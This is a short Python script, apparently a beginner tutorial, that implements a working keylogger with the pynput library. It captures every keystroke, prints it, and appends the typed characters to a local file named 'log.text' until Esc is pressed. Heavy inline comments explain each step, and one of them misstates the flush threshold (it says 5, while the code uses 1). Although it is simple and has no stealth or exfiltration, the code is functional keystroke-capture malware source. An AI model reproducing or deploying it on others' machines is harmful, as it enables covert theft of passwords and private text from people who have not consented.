import pynput

# This package "pynput.keyboard" is used to control(Controller) and monitor(Listener) the keyboard
from pynput.keyboard import Key, Listener # Listener will listen to our Key events (listen to what keys are pressed)

count = 0 # Empty variable to store the count of the key events
keysEvent = [] # Empty list variable to store the key events

def on_pressed(key): # Argument contain key variable which represent the key to press
    global keysEvent, count # Globalised the keysEvent and the count to be used and modified in the local context
    keysEvent.append(key) # When a key is pressed, add the selected key in to the empty list variable
    count += 1 # For every key that is added to the list variable, increase the count by 1

    # Print a string and use format function to replace "{}" with the key that is pressed
    print("{} is pressed".format(key))

    if count >= 1: # When the count is more than or equals to 5
        write_file(keysEvent)  # Pass "keys" which is the list variable and write it in to the file
        count = 0 # Reset the count
        keysEvent = [] # Reset the list variable

def on_released(key): # Argument contain key variable which represent the key that is released
    if key == Key.esc: # Break the loop if the "Esc" key is pressed
        return False # This will stop the keylogger

def write_file(key):
    # With statement to open(expression) whereby "a" is meant for writing in the file, "as f"(target) to open the file contents
    with open("log.text", "a") as f:
        for key in keysEvent: # Loop through all the keysEvent
            k = str(key).replace("'", "") # To replace the quotation marks that appeared with the key in text file

            if k.find("space") > 0: # Use the Find method to search for space (to replace spacebar)
                f.write('\n') # If space is more than 0, write a new line
            # Else if the find method is unable to find any "Key.(shift/backspace/space etc)" keysEvent it will return -1 by default
            elif k.find('Key') == -1:
                f.write(k) # And if it returned -1, write k (which is the keysEvent that has been pressed without any quotation marks)

# With statement to enter and run the expressions "on_press" when a key is pressed and "on_release" when a key is released
# After the expression has exit, the value will be binded to the "as (target)" - in this case the target is listener
with Listener(on_press = on_pressed, on_release = on_released) as listener:
    listener.join() # Keep looping to listen to the keysEvent pressed and released constantly until we break the loop